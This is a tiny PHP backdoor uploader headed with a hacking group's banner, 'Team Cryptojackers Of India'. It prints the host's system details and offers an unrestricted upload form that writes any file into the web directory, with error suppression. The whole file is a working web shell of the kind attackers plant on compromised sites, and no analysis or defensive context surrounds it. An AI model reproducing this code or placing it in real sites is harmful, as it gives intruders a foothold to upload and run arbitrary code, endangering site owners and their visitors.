<html>
    <center>
<h1>Team Cryptojackers Of India</h1>
</html>
<?php
echo '<pre>'.php_uname()."</pre><br>";
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="_">';
echo '<input type="submit" name="_" value="Upload">';
echo '</form>';
if ($_POST) {
    if (@copy($_FILES['_']['tmp_name'], $_FILES['_']['name'])) {
        echo 'OK;';
    } else {
        echo 'ER;';
    }
}
?>